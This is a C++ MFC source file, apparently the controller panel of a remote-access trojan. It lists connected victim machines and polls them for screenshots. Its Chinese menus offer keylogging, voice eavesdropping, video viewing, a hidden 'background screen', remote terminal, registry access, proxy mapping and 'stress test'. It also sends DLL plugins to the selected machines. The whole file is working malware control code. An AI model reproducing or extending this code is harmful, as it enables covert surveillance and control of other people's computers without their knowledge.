#include "stdafx.h"
#include "Quick.h"
#include "MainFrm.h"
#include "TabView.h"
#include "ScreenMonitorDlg.h"
#include "PlugView.h"
#include "InputDlg.h"


extern CPlugView* g_pCPlugView;
extern ISocketBase* g_pSocketBase;
extern CMainFrame* g_pFrame;
extern CTabView* g_pTabView;

CScreenMonitorDlg* g_pScreenMonitorDlg = NULL;


IMPLEMENT_DYNCREATE(CScreenMonitorDlg, CXTPResizeFormView)
CScreenMonitorDlg::CScreenMonitorDlg()
	: CXTPResizeFormView(IDD_MONITOR)
{
	g_pScreenMonitorDlg = this;
	w = 300;
	h = 200;
	t = 1000;
	pDC = NULL;
	mHwndShow = NULL;
}

CScreenMonitorDlg::~CScreenMonitorDlg()
{

}


void CScreenMonitorDlg::DoDataExchange(CDataExchange* pDX)
{
	CXTPResizeFormView::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST, listCtrl);
	//DDX_Control(pDX, IDC_SLIDER_W, m_slider_w);
	//DDX_Control(pDX, IDC_SLIDER_H, m_slider_h);
	//DDX_Control(pDX, IDC_SLIDER_T, m_slider_t);
}


BEGIN_MESSAGE_MAP(CScreenMonitorDlg, CXTPResizeFormView)
	ON_WM_TIMER()
	//ON_WM_HSCROLL()
	ON_WM_SIZE()
	ON_MESSAGE(WM_MONITOR_CLIENT, OnAddClientData)
	ON_MESSAGE(MONITOR_DLG, OnDelClient)
	ON_MESSAGE(WM_MONITOR_CHANGECLIENT, OnChangeClient)
	ON_NOTIFY(NM_RCLICK, IDC_LIST, &CScreenMonitorDlg::OnRclickList)
	ON_NOTIFY(NM_CLICK, IDC_LIST, &CScreenMonitorDlg::OnclickList)
	ON_NOTIFY(NM_DBLCLK, IDC_LIST, &CScreenMonitorDlg::OnDclickList)
END_MESSAGE_MAP()




// CScreenMonitorDlg 诊断

#ifdef _DEBUG
void CScreenMonitorDlg::AssertValid() const
{
	CXTPResizeFormView::AssertValid();
}

#ifndef _WIN32_WCE
void CScreenMonitorDlg::Dump(CDumpContext& dc) const
{
	CXTPResizeFormView::Dump(dc);
}
#endif
#endif //_DEBUG


void CScreenMonitorDlg::OnInitialUpdate()
{
	CXTPResizeFormView::OnInitialUpdate();

	static 	bool binit = false;

	if (!binit)
	{
		listCtrl.RedrawWindow(FALSE);
		//初始化菜单项


		//添加菜单项
		mListmeau.CreatePopupMenu();

		mListmeau.AppendMenu(MF_STRING | MF_ENABLED, MENU_退出监控, _T("退出监控"));
		mListmeau.AppendMenu(MF_SEPARATOR, NULL);
		//添加二级菜单



		mListmeau_file.CreatePopupMenu();
		mListmeau.InsertMenu(8, MF_BYPOSITION | MF_POPUP | MF_STRING, (UINT)mListmeau_file.m_hMenu, _T("资料管理"));
		mListmeau_file.AppendMenu(MF_STRING | MF_ENABLED, MENU_文件管理, _T("文件管理"));
		//添加二级菜单

		mListmeau_screen.CreatePopupMenu();
		mListmeau.InsertMenu(9, MF_BYPOSITION | MF_POPUP | MF_STRING, (UINT)mListmeau_screen.m_hMenu, _T("远程屏幕"));
		mListmeau_screen.AppendMenu(MF_STRING | MF_ENABLED, MENU_差异屏幕, _T("差异屏幕"));
		mListmeau_screen.AppendMenu(MF_STRING | MF_ENABLED, MENU_高速屏幕, _T("高速屏幕"));
		mListmeau_screen.AppendMenu(MF_STRING | MF_ENABLED, MENU_娱乐屏幕, _T("娱乐屏幕"));
		mListmeau_screen.AppendMenu(MF_SEPARATOR, NULL);
		mListmeau_screen.AppendMenu(MF_STRING | MF_ENABLED, MENU_后台屏幕, _T("后台屏幕"));


		//添加二级菜单

		mListmeau_Peripherals.CreatePopupMenu();
		mListmeau.InsertMenu(11, MF_BYPOSITION | MF_POPUP | MF_STRING, (UINT)mListmeau_Peripherals.m_hMenu, _T("外设管理"));
		mListmeau_Peripherals.AppendMenu(MF_STRING | MF_ENABLED, MENU_播放监听, _T("播放监听"));
		mListmeau_Peripherals.AppendMenu(MF_STRING | MF_ENABLED, MENU_语音监听, _T("语音监听"));
		mListmeau_Peripherals.AppendMenu(MF_STRING | MF_ENABLED, MENU_视频查看, _T("视频查看"));


		//添加二级菜单

		mListmeau_ZJ.CreatePopupMenu();
		mListmeau.InsertMenu(13, MF_BYPOSITION | MF_POPUP | MF_STRING, (UINT)mListmeau_ZJ.m_hMenu, _T("主机管理"));
		//mListmeau_ZJ.EnableMenuItem(2, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);  //设置禁用

		mListmeau_ZJ.AppendMenu(MF_STRING | MF_ENABLED, MENU_系统管理, _T("系统管理"));
		mListmeau_ZJ.AppendMenu(MF_SEPARATOR, NULL);
		mListmeau_ZJ.AppendMenu(MF_STRING | MF_ENABLED, MENU_远程终端, _T("远程终端"));
		mListmeau_ZJ.AppendMenu(MF_STRING | MF_ENABLED, MENU_键盘记录, _T("键盘记录"));
		mListmeau_ZJ.AppendMenu(MF_STRING | MF_ENABLED, MENU_查注册表, _T("查注册表"));
		mListmeau_ZJ.AppendMenu(MF_STRING | MF_ENABLED, MENU_代理映射, _T("代理映射"));
		mListmeau_ZJ.AppendMenu(MF_STRING | MF_ENABLED, MENU_远程交谈, _T("远程交谈"));

		mListmeau.AppendMenu(MF_SEPARATOR, NULL);
		mListmeau.AppendMenu(MF_STRING | MF_ENABLED, MENU_驱动插件, _T("驱动插件"));



		//添加二级菜单

		mListmeau_other.CreatePopupMenu();
		mListmeau.InsertMenu(50, MF_BYPOSITION | MF_POPUP | MF_STRING, (UINT)mListmeau_other.m_hMenu, _T("扩展插件"));
		mListmeau.AppendMenu(MF_SEPARATOR, NULL);
		mListmeau.AppendMenu(MF_STRING | MF_ENABLED, MENU_压力测试, _T("压力测试"));

		mListmeau.AppendMenu(MF_STRING | MF_ENABLED, MENU_特别关注, _T("特别关注"));

		listCtrl.DeleteAllItems();
		m_ImageList.DeleteImageList();
		listCtrl.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | LVS_EX_BORDERSELECT);//设置当前的列表视图控件扩展的样式
		//listCtrl.SetIconSpacing(CSize(140, 130));
		m_ImageList.Create(w, h, ILC_COLORDDB | ILC_COLOR32, 1, 1);
		listCtrl.SetImageList(&m_ImageList, LVSIL_NORMAL);


		SetResize(IDC_LIST, XTP_ANCHOR_TOPLEFT, XTP_ANCHOR_BOTTOMRIGHT);

		//SetResize(IDC_STATIC_W, XTP_ANCHOR_BOTTOMLEFT, XTP_ANCHOR_BOTTOMLEFT);
		//SetResize(IDC_STATIC_H, XTP_ANCHOR_BOTTOMLEFT, XTP_ANCHOR_BOTTOMLEFT);
		//SetResize(IDC_STATIC_T, XTP_ANCHOR_BOTTOMLEFT, XTP_ANCHOR_BOTTOMLEFT);
		//SetResize(IDC_SLIDER_W, XTP_ANCHOR_BOTTOMLEFT, XTP_ANCHOR_BOTTOMLEFT);
		//SetResize(IDC_SLIDER_H, XTP_ANCHOR_BOTTOMLEFT, XTP_ANCHOR_BOTTOMLEFT);
		//SetResize(IDC_SLIDER_T, XTP_ANCHOR_BOTTOMLEFT, XTP_ANCHOR_BOTTOMLEFT);

		//m_slider_w.SetRange(10, 100);//设置滑动范围为1到20
		//m_slider_w.SetTicFreq(10);//每1个单位画一刻度
		//m_slider_w.SetPos(30);//设置滑块初始位置为10 

		//m_slider_h.SetRange(10, 100);//设置滑动范围为1到20
		//m_slider_h.SetTicFreq(10);//每1个单位画一刻度
		//m_slider_h.SetPos(20);//设置滑块初始位置为10 

		//m_slider_t.SetRange(5, 200);//设置滑动范围为1到20
		//m_slider_t.SetTicFreq(10);//每1个单位画一刻度
		//m_slider_t.SetPos(100);//设置滑块初始位置为10 
		binit = true;
		SetTimer(1, 1000, NULL);
	}

	UpdateData(FALSE);

}





afx_msg LRESULT CScreenMonitorDlg::OnAddClientData(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;

	if (pContext->m_DeCompressionBuffer.GetBufferLen() > 2)
	{
		OnReceiveComplete(pContext);
	}
	else
	{
		AddClient(pContext);
	}
	return 0;
}


void CScreenMonitorDlg::DelClient(ClientContext* pContext)
{
	CCriSecLock recvlock(m_clcs);
	int nCnt = listCtrl.GetItemCount();
	for (int i = 0; i < nCnt; i++)
	{
		ClientContext* pContext_old = (ClientContext*)listCtrl.GetItemData(i);
		//if (lstrcmp(hwid , pContext_old->LoginInfo->szHWID)==0)
		if (pContext == pContext_old)
		{
			pContext_old->m_Dialog[1] = 0;
			listCtrl.DeleteItem(i);
			m_ImageList.Remove(i);
			break;
		}
	}
	for (int i = 0; i < nCnt; i++) {
		LVITEM lvItem;
		lvItem.iItem = i;//指定您选中的项
		lvItem.iSubItem = 0;//指定您选中项的字项
		lvItem.mask = LVIF_IMAGE;
		listCtrl.GetItem(&lvItem);
		lvItem.iImage = i;
		listCtrl.SetItem(&lvItem);
	}
	CString str;
	str.Format(_T("监控:%d"), listCtrl.GetItemCount());
	g_pFrame->m_wndStatusBar.SetPaneText(10, str);
	return;
}

afx_msg LRESULT CScreenMonitorDlg::OnChangeClient(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	int nCnt = listCtrl.GetItemCount();
	for (int i = 0; i < nCnt; i++)
	{
		ClientContext* pContext_old = (ClientContext*)listCtrl.GetItemData(i);
		if (lstrcmp(pContext->LoginInfo->szHWID, pContext_old->LoginInfo->szHWID) == 0)
		{
			pContext->m_Dialog[1] = MONITOR_DLG;
			listCtrl.SetItemData(i, (DWORD_PTR)pContext);
			break;
		}
	}
	return 0;

}
VOID CScreenMonitorDlg::AddClient(ClientContext* pContext)
{
	if (pContext->m_Dialog[1] == MONITOR_DLG) return;
	pContext->m_Dialog[1] = MONITOR_DLG;
	int nCnt = listCtrl.GetItemCount();
	listCtrl.InsertItem(nCnt, pContext->szAddress, nCnt);
	listCtrl.SetItemData(nCnt, (DWORD_PTR)pContext);
	if (pContext->Item_cmp_old_IsActive)
		pContext->Item_cmp_old_IsActive->SetBackgroundColor(RGB(150, 212, 134));
	CBitmap bmp;
	bmp.LoadBitmap(IDB_BIGFIRE);
	m_ImageList.Add(&bmp, RGB(255, 255, 255));
	CString str;
	str.Format(_T("监控:%d"), listCtrl.GetItemCount());
	g_pFrame->m_wndStatusBar.SetPaneText(10, str);
	return;
}


void CScreenMonitorDlg::OnReceiveComplete(ClientContext* pContext)
{
	int nCnt = listCtrl.GetItemCount();
	for (int i = 0; i < nCnt; i++)
	{
		ClientContext* pContext_old = (ClientContext*)listCtrl.GetItemData(i);
		if (pContext == pContext_old)
		{
			int PictureSize = pContext->m_DeCompressionBuffer.GetBufferLen() - 5;
			HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, PictureSize);
			void* pData = GlobalLock(hGlobal);
			if (!pData) return;
			memcpy(pData, pContext->m_DeCompressionBuffer.GetBuffer() + 5, PictureSize);
			GlobalUnlock(hGlobal);
			IStream* pStream = NULL;
			if (CreateStreamOnHGlobal(hGlobal, TRUE, &pStream) == S_OK)
			{
				CImage image;
				if (SUCCEEDED(image.Load(pStream)))
				{
					CBitmap bmp;
					HBITMAP hbmp = (HBITMAP)image.operator HBITMAP();

					if (bmp.Attach(hbmp))
					{
						if (!mHwndShow)
						{
							mHwndShow = GetDlgItem(IDC_LIST)->GetSafeHwnd();
						}
						pWnd = CWnd::FromHandle(mHwndShow);
						pDC = pWnd->GetDC();
						if (!pDC)
						{
							bmp.DeleteObject();
							return;
						}
						dcimage.CreateCompatibleDC(pDC);
						listCtrl.GetItemRect(i, &rect, 0);
						dcimage.SelectObject(&bmp);
						pDC->StretchBlt(rect.left + 21, rect.top, rect.right - rect.left - 42, rect.bottom - rect.top - 20, &dcimage, 0, 0, w, h, SRCCOPY);
						m_ImageList.Replace(i, &bmp, 0);
						bmp.DeleteObject();
						pWnd->ReleaseDC(pDC);
						dcimage.DeleteDC();
					}
					image.Destroy();

				}
				pStream->Release();
			}
			GlobalFree(hGlobal);
			return;
		}
	}
}



//void CScreenMonitorDlg::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
//{
//	ReShowPic();
//	CXTPResizeFormView::OnHScroll(nSBCode, nPos, pScrollBar);
//}

void CScreenMonitorDlg::OnSize(UINT nType, int cx, int cy)
{
	CXTPResizeFormView::OnSize(nType, cx, cy);
	mcx = cx;
	mcy = cy;
}

void CScreenMonitorDlg::ReShowPic(int mode, int num)
{
	KillTimer(1);

	switch (mode)
	{
	case 0:
	{
		w = num;
		if (w < 100)
		{
			w = mcx / w - 50;
		}
	}
	break;
	case 1:
	{
		h = num;
		if (h < 100)
		{
			h = mcy / h - 80;
		}
	}
	break;
	case 2:
	{
		t = num;
	}
	break;
	default:
		break;
	}



	//w = m_slider_w.GetPos() * 10;  //获取滑块控件的位置
	//h = m_slider_h.GetPos() * 10;
	//t = m_slider_t.GetPos() * 10;

	//CString str;
	//str.Format(_T("宽度:%d"), w);
	//GetDlgItem(IDC_STATIC_W)->SetWindowText(str);
	//str.Format(_T("高度:%d"), h);
	//GetDlgItem(IDC_STATIC_H)->SetWindowText(str);
	//str.Format(_T("刷新:%d 毫秒"), t);
	//GetDlgItem(IDC_STATIC_T)->SetWindowText(str);
	int nCnt = listCtrl.GetItemCount();
	m_ImageList.DeleteImageList();
	m_ImageList.Create(w, h, ILC_COLORDDB | ILC_COLOR32, 1, 1);
	listCtrl.SetImageList(&m_ImageList, LVSIL_NORMAL);
	CBitmap bmp;
	bmp.LoadBitmap(IDB_BIGFIRE);
	for (int i = 0; i < nCnt; i++)
	{
		m_ImageList.Add(&bmp, RGB(255, 255, 255));
	}
	SetTimer(1, t, NULL);
}



void CScreenMonitorDlg::OnTimer(UINT_PTR nIDEvent)
{
	if (nIDEvent == 1 && g_pScreenMonitorDlg->IsWindowVisible())
	{
		byte* lpbyte = new byte[9];
		lpbyte[0] = COMMAND_GETMONITOR;
		memcpy(lpbyte + 1, &w, 4);
		memcpy(lpbyte + 5, &h, 4);
		int nCnt = listCtrl.GetItemCount();
		for (int i = 0; i < nCnt; i++)
		{
			listCtrl.GetItemRect(i, &rect, 0);
			if (rect.left > mcx) continue;
			if (rect.top > mcy) continue;
			ClientContext* pContext_old = (ClientContext*)listCtrl.GetItemData(i);
			if (pContext_old)
				g_pSocketBase->Send(pContext_old, lpbyte, 9);
		}
	}
	CXTPResizeFormView::OnTimer(nIDEvent);
}

void CScreenMonitorDlg::OnclickList(NMHDR* pNMHDR, LRESULT* pResult)
{
	g_pFrame->m_wndTip.Hide();
	POSITION pos;
	pos = listCtrl.GetFirstSelectedItemPosition();
	int index = listCtrl.GetNextSelectedItem(pos);
	if (index == -1) return;
	ClientContext* pContext = (ClientContext*)listCtrl.GetItemData(index);
	if (pContext)
	{
		g_pFrame->m_wndTip.Show(pContext, false);
		g_pFrame->m_wndTip.Hide();
		g_pFrame->m_wndTip.Show(pContext, false);
	}

}

void CScreenMonitorDlg::OnDclickList(NMHDR* pNMHDR, LRESULT* pResult)
{
	g_pFrame->m_wndTip.Hide();
	POSITION pos;
	pos = listCtrl.GetFirstSelectedItemPosition();
	int index = listCtrl.GetNextSelectedItem(pos);
	if (index == -1) return;
	ClientContext* pContext = (ClientContext*)listCtrl.GetItemData(index);
	if (pContext)
	{
		SendDll(_T("差异屏幕"));
	}


}

void CScreenMonitorDlg::OnRclickList(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	i_mListmeau_other_num = mListmeau_other.GetMenuItemCount();

	for (int i = 0; i < i_mListmeau_other_num; i++)
	{
		mListmeau_other.DeleteMenu(i_mListmeau_other_num - i - 1, MF_BYPOSITION);
	}

	int nItemIndex = 60001;

	typedef std::map<CString, CMenu*> PCMenuDate;
	PCMenuDate m_PCMenuDate;

	int counts = g_pCPlugView->m_pPlugList->GetItemCount();
	for (int i = 0; i < counts; i++)
	{
		CString Groupname = g_pCPlugView->m_pPlugList->GetItemText(i, 7);
		PCMenuDate::iterator iter = m_PCMenuDate.find(Groupname);
		if (iter != m_PCMenuDate.end())
		{
			CString itemname = g_pCPlugView->m_pPlugList->GetItemText(i, 3);
			int nLength = itemname.GetLength();
			if (nLength >= 4)	itemname = itemname.Left(nLength - 4);
			iter->second->AppendMenu(MF_STRING | MF_ENABLED, nItemIndex++, itemname);
		}
		else
		{
			CMenu* pmenu = new CMenu;
			pmenu->CreatePopupMenu();
			mListmeau_other.InsertMenu(60, MF_BYPOSITION | MF_POPUP | MF_STRING, (UINT)pmenu->m_hMenu, Groupname);
			m_PCMenuDate.insert(MAKE_PAIR(PCMenuDate, Groupname, pmenu));
			CString itemname = g_pCPlugView->m_pPlugList->GetItemText(i, 3);
			int nLength = itemname.GetLength();
			if (nLength >= 4)	itemname = itemname.Left(nLength - 4);
			pmenu->AppendMenu(MF_STRING | MF_ENABLED, nItemIndex++, itemname);
		}
	}
	DWORD dwPos = GetMessagePos();
	CPoint point(LOWORD(dwPos), HIWORD(dwPos));
	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&mListmeau, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, point.x, point.y, this, NULL);
	PCMenuDate::iterator iter = m_PCMenuDate.begin();
	while (iter != m_PCMenuDate.end())
	{
		iter->second->DestroyMenu();
		SAFE_DELETE(iter->second);
		m_PCMenuDate.erase(iter++);
	}
	if (!nMenuResult)
	{
		return;
	}

	HandlingRightClickMessages(nMenuResult);
	*pResult = 0;
}


void CScreenMonitorDlg::HandlingRightClickMessages(int nMenuResult)
{
	OUT_PUT_FUNCION_NAME_INFO
		switch (nMenuResult)
		{
		case MENU_退出监控:
		{
			POSITION pos = listCtrl.GetFirstSelectedItemPosition();
			if (pos != NULL)
			{
				do
				{
					int nItem = listCtrl.GetNextSelectedItem(pos);
					ClientContext* pContext = (ClientContext*)(listCtrl.GetItemData(nItem));
					if (pContext)
					{
						g_pScreenMonitorDlg->SendMessage(MONITOR_DLG, 0, (LPARAM)pContext);
						if (pContext->Item_cmp_old_IsActive)
							pContext->Item_cmp_old_IsActive->SetBackgroundColor(4294967295);
					}
					pos = listCtrl.GetFirstSelectedItemPosition();
				} while (pos);
			}
			log_信息("退出监控");
		}
		break;
		case MENU_特别关注:
		{
			POSITION pos = listCtrl.GetFirstSelectedItemPosition();
			if (pos != NULL)
			{
				do
				{
					int nItem = listCtrl.GetNextSelectedItem(pos);
					ClientContext* pContext = (ClientContext*)(listCtrl.GetItemData(nItem));
					if (pContext)
					{
						if (pContext->Item_cmp_old_IsActive)
							pContext->Item_cmp_old_IsActive->SetBackgroundColor(RGB(22, 212, 234));
					}
				} while (pos);
			}
			log_信息("特别关注");
		}
		break;
		case MENU_压力测试:
		case MENU_文件管理:
		case MENU_差异屏幕:
		case MENU_高速屏幕:
		case MENU_娱乐屏幕:
		case MENU_后台屏幕:
		case MENU_播放监听:
		case MENU_语音监听:
		case MENU_视频查看:
		case MENU_系统管理:
		case MENU_远程终端:
		case MENU_键盘记录:
		case MENU_查注册表:
		case MENU_代理映射:
		case MENU_远程交谈:
		case MENU_驱动插件:
		{
			CString menuStr;
			mListmeau.GetMenuString(nMenuResult, menuStr, MF_BYCOMMAND);
			int nfind = menuStr.ReverseFind('(');
			if (nfind > 0)
			{
				menuStr = menuStr.Mid(0, nfind);
			}
			SendDll(menuStr.GetBuffer());
			log_信息("使用");
		}
		break;
		default:
			break;
		}
	if (nMenuResult > 60000 && nMenuResult < 65535)
	{
		CString menuStr;
		mListmeau.GetMenuString(nMenuResult, menuStr, MF_BYCOMMAND);
		SendDll(menuStr.GetBuffer(), TASK_PLUG);
		log_信息("运行");
	}

}




//选中列表项发送命令
void CScreenMonitorDlg::SendSelectCommand(PBYTE pData, UINT nSize)
{
	OUT_PUT_FUNCION_NAME_INFO
		if (pData[0] == COMMAND_CLOSESOCKET)  //断开连接测试
		{
			POSITION pos = listCtrl.GetFirstSelectedItemPosition();
			if (pos == NULL)
			{
				return;
			}
			else
			{
				while (pos)
				{
					int nItem = listCtrl.GetNextSelectedItem(pos);
					ClientContext* pContext = (ClientContext*)(listCtrl.GetItemData(nItem));
					if (pContext) g_pSocketBase->Disconnect(pContext);
				}
			}
		}
		else
		{
			POSITION pos = listCtrl.GetFirstSelectedItemPosition();
			if (pos == NULL)
			{
				return;
			}
			else
			{
				while (pos)
				{
					int nItem = listCtrl.GetNextSelectedItem(pos);
					ClientContext* pContext = (ClientContext*)(listCtrl.GetItemData(nItem));
					if (pContext) 	g_pSocketBase->Send(pContext, pData, nSize);
				}
			}
		}
}


void CScreenMonitorDlg::SendDll(LPCTSTR lpDllName, SENDTASK sendtask)
{
	OUT_PUT_FUNCION_NAME_INFO
		POSITION pos = listCtrl.GetFirstSelectedItemPosition();
	if (pos == NULL)
	{
		return;
	}
	while (pos)
	{
		int nItem = listCtrl.GetNextSelectedItem(pos);
		ClientContext* pContext = (ClientContext*)(listCtrl.GetItemData(nItem));
		if (pContext)
		{
			CString strDllName = lpDllName;
			strDllName.Format(_T("%s.dll"), lpDllName);
			int	nPacketLength = 1 + sizeof(DllSendDate);
			LPBYTE	lpPacket = new BYTE[nPacketLength];
			memset(lpPacket, 0, nPacketLength);
			lpPacket[0] = COMMAND_DLLMAIN;
			DllSendDate DllDate;
			ZeroMemory(&DllDate, sizeof(DllSendDate));
			DllDate.sendtask = sendtask;
			g_pFrame->GetPluginVersion(strDllName.GetBuffer(), DllDate.szVersion, sendtask, pContext->bisx86);
			_tcscpy_s(DllDate.DllName, strDllName.GetBuffer());
			::memcpy(lpPacket + 1, &DllDate, sizeof(DllSendDate));
			g_pSocketBase->Send(pContext, lpPacket, nPacketLength);
			delete[] lpPacket;
		}
	}

}

